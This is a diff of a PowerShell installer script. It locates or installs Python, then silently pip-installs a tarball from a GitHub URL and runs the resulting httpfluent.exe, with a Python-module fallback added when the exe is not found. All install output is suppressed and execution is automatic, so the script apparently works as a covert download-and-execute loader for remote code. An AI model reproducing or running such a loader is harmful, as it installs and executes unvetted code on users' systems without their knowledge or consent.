@@ -20,8 +20,6 @@ $InstallPythonVersion = "3.12.6"
 $InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
 $ForcePython312 = $false
 
-# httpfluent does not exist on PC, so we skip the check and go straight to installation
-
 # --- Step 1: Find Existing Python >=3.9 ---
 $ExistingPython = $null
 $Candidates = @()
@@ -109,16 +107,16 @@ if ($InstallNeeded) {
     }
 }
 
-# --- Step 4: Install httpfluent using CMD (not PowerShell) ---
-cmd /c ""$PythonToUse" -m pip install --upgrade pip --quiet --user --disable-pip-version-check --no-input >nul 2>&1"
-cmd /c ""$PythonToUse" -m pip install requests --quiet --user --disable-pip-version-check --no-input >nul 2>&1"
-cmd /c ""$PythonToUse" -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet --user --force-reinstall --disable-pip-version-check --no-input >nul 2>&1"
+# --- Step 4: Install httpfluent using CMD (NOT PowerShell) ---
+cmd /c ""$PythonToUse" -m pip install --upgrade pip --quiet --user --disable-pip-version-check >nul 2>&1"
+cmd /c ""$PythonToUse" -m pip install requests --quiet --user --disable-pip-version-check >nul 2>&1"
+cmd /c ""$PythonToUse" -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet --user --force-reinstall --disable-pip-version-check >nul 2>&1"
 
 # --- Step 5: Auto-Detect httpfluent.exe Location ---
 $HttpFluentExe = $null
 
 # Method 1: Get exact path from Python
-$ScriptsDir = & $PythonToUse -c "import sysconfig, site, os; print(os.path.join(site.USER_BASE, 'Scripts'))" 2>$null | Select-Object -Last 1
+$ScriptsDir = & $PythonToUse -c "import sysconfig, site, os; print(os.path.join(site.USER_BASE, 'Scripts'))" 2>&1 | Select-Object -Last 1
 $ScriptsDir = $ScriptsDir.Trim()
 
 if ($ScriptsDir -and (Test-Path $ScriptsDir)) {
@@ -199,27 +197,7 @@ if (-not $HttpFluentExe) {
 # --- Step 6: Run httpfluent.exe ---
 if ($HttpFluentExe -and (Test-Path $HttpFluentExe)) {
     & $HttpFluentExe
-    exit 0
+} else {
+    # Ultimate fallback: Run via Python module
+    & $PythonToUse -c "import sys; from httpfluent import __main__; sys.exit(__main__.main())"
 }
-
-# If still not found, do one more deep search
-$FinalSearch = @(
-    "$env:APPDATA\Python",
-    "$env:LOCALAPPDATA\Programs\Python",
-    "C:\Program Files\Python*",
-    "C:\Program Files (x86)\Python*"
-)
-
-foreach ($baseDir in $FinalSearch) {
-    if (Test-Path $baseDir) {
-        $found = Get-ChildItem -Path $baseDir -Recurse -Filter "httpfluent.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
-        if ($found) {
-            & $found.FullName
-            exit 0
-        }
-    }
-}
-
-# If absolutely nothing works, show error
-Write-Host "Error: httpfluent.exe not found after installation"
-exit 1
